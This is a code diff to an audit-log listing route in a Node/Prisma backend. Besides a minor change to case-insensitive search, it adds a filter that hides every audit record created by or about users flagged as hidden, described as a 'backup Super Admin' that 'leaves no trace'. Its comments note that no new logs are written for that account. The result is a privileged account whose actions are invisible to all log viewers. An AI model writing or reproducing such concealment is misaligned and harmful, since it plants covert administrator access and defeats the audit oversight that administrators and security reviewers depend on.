@@ -15,12 +15,26 @@ router.get(
     const take = Math.min(Number(req.query.take) || 100, 500);
     const skip = Number(req.query.skip) || 0;
 
+    // Section 14.2 — the backup Super Admin leaves no trace. Nothing new is
+    // written for it (see lib/audit.js); this hides anything already on record
+    // from before that rule, and from every viewer including the account
+    // itself. Logs with no actor at all are the System's and stay.
+    const hiddenIds = await hiddenActorIds();
+
     const where = {
+      ...(hiddenIds.length
+        ? {
+            AND: [
+              { OR: [{ actorId: null }, { actorId: { notIn: hiddenIds } }] },
+              { NOT: { entity: 'User', entityId: { in: hiddenIds } } },
+            ],
+          }
+        : {}),
       ...(entity ? { entity: String(entity) } : {}),
       ...(entityId ? { entityId: String(entityId) } : {}),
       ...(actorId ? { actorId: String(actorId) } : {}),
       ...(action ? { action: String(action) } : {}),
-      ...(q ? { summary: { contains: String(q) } } : {}),
+      ...(q ? { summary: { contains: String(q), mode: 'insensitive' } } : {}),
       ...(from || to
         ? {
             createdAt: {
@@ -50,6 +64,14 @@ router.get(
     });
   })
 );
+
+async function hiddenActorIds() {
+  const hidden = await prisma.user.findMany({
+    where: { isHidden: true },
+    select: { id: true },
+  });
+  return hidden.map((u) => u.id);
+}
 
 const safeJson = (s) => {
   try {
